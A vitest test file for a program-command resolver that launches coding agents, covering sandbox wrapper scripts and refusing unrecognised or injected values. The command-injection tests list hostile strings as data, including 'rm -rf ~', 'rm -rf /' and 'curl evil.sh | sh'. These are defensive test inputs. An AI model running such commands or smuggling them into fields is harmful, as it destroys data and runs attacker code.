/**
 * Tests for lib/program-command.ts.
 *
 * Field report (3Metas): one agent reads untrusted external mail and had to run
 * inside `sandbox-exec`, but `program` accepted only a fixed list of names, so
 * it could not point at a wrapper script. The workaround was to wake with
 * `startProgram:false` and launch the wrapped program by hand — which holds
 * until the next ordinary wake starts the program UNSANDBOXED with nothing to
 * warn anyone. They built a detector because they could not build a preventer.
 *
 * The second half is worse than the first: the old ladder ended in
 * `return 'claude'`, so any value it did not recognise silently became bare
 * Claude Code — the exact outcome that must not happen for a sandboxed agent.
 */

import { describe, it, expect, beforeAll, afterAll } from 'vitest'
import fs from 'fs'
import os from 'os'
import path from 'path'
import { resolveProgramCommand, isNoProgram } from '@/lib/program-command'

let dir: string
let wrapper: string
let claudeWrapper: string
let notExecutable: string

beforeAll(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'progcmd-'))
  wrapper = path.join(dir, 'sandboxed-agent.sh')
  claudeWrapper = path.join(dir, 'claude-sandboxed.sh')
  notExecutable = path.join(dir, 'not-executable.sh')
  for (const f of [wrapper, claudeWrapper]) {
    fs.writeFileSync(f, '#!/bin/sh\nexec sandbox-exec -f profile.sb claude "$@"\n')
    fs.chmodSync(f, 0o755)
  }
  fs.writeFileSync(notExecutable, '#!/bin/sh\n')
  fs.chmodSync(notExecutable, 0o644)
})

afterAll(() => fs.rmSync(dir, { recursive: true, force: true }))

describe('known program names', () => {
  it.each([
    ['claude-code', 'claude'],
    ['Claude Code', 'claude'],
    ['codex', 'codex'],
    ['aider', 'aider'],
    ['cursor', 'cursor'],
    ['gemini', 'gemini'],
    ['opencode', 'opencode'],
    ['openclaw', 'openclaw'],
  ])('resolves %s to %s', (program, expected) => {
    expect(resolveProgramCommand(program).command).toBe(expected)
  })

  it('is case-insensitive, as the registry holds both spellings', () => {
    // The live registry has 75 "claude-code" and 8 "Claude Code".
    expect(resolveProgramCommand('Claude Code').kind).toBe('claude')
  })
})

describe('wrapper scripts', () => {
  it('accepts an absolute path to an executable', () => {
    expect(resolveProgramCommand(wrapper).command).toBe(wrapper)
  })

  it('classifies a claude-named wrapper as claude, so it keeps claude flags', () => {
    // Losing --permission-mode on a sandboxed agent would be a silent
    // downgrade of exactly the agent that needs it most.
    expect(resolveProgramCommand(claudeWrapper).kind).toBe('claude')
  })

  it('classifies a non-claude wrapper as a plain wrapper', () => {
    expect(resolveProgramCommand(wrapper).kind).toBe('wrapper')
  })

  it('expands a ~/-rooted path', () => {
    const rel = wrapper.startsWith(os.homedir())
      ? '~' + wrapper.slice(os.homedir().length)
      : null
    if (!rel) return // tmpdir is outside $HOME on this platform
    expect(resolveProgramCommand(rel).command).toBe(wrapper)
  })
})

describe('refusing rather than guessing', () => {
  it('returns no command for an unrecognised name', () => {
    // The old ladder returned 'claude' here.
    const r = resolveProgramCommand('my-custom-agent')
    expect(r.command).toBeNull()
    expect(r.error).toMatch(/unrecognised/i)
  })

  it('refuses a wrapper that does not exist', () => {
    const r = resolveProgramCommand('/nonexistent/wrapper.sh')
    expect(r.command).toBeNull()
    expect(r.error).toMatch(/missing or not executable/)
  })

  it('refuses a wrapper that is not executable', () => {
    expect(resolveProgramCommand(notExecutable).command).toBeNull()
  })

  it('refuses a directory', () => {
    expect(resolveProgramCommand(dir).command).toBeNull()
  })

  it('refuses a relative path, which depends on the launch cwd', () => {
    const r = resolveProgramCommand('./wrapper.sh')
    expect(r.command).toBeNull()
    expect(r.error).toMatch(/absolute/)
  })

  it('refuses an empty program', () => {
    expect(resolveProgramCommand('').command).toBeNull()
  })
})

describe('command injection', () => {
  // `program` is interpolated into a shell command line that tmux types into
  // the pane, so a path that can break out of it is a remote-ish code
  // execution primitive for anyone who can edit an agent record.
  it.each([
    '/tmp/x; rm -rf ~',
    '/tmp/x && curl evil.sh | sh',
    '/tmp/x`whoami`',
    '/tmp/x$(id)',
    '/tmp/x|tee /tmp/y',
    "/tmp/x'",
    '/tmp/x\nrm -rf /',
  ])('refuses %j', (bad) => {
    expect(resolveProgramCommand(bad).command).toBeNull()
  })

  it('refuses a path with whitespace rather than trying to quote it', () => {
    expect(resolveProgramCommand('/tmp/my wrapper.sh').command).toBeNull()
  })
})

describe('isNoProgram', () => {
  it.each(['none', 'terminal', 'None', 'TERMINAL', ' none '])('%s means launch nothing', (v) => {
    expect(isNoProgram(v)).toBe(true)
  })

  it('a real program is not "no program"', () => {
    expect(isNoProgram('claude-code')).toBe(false)
  })
})
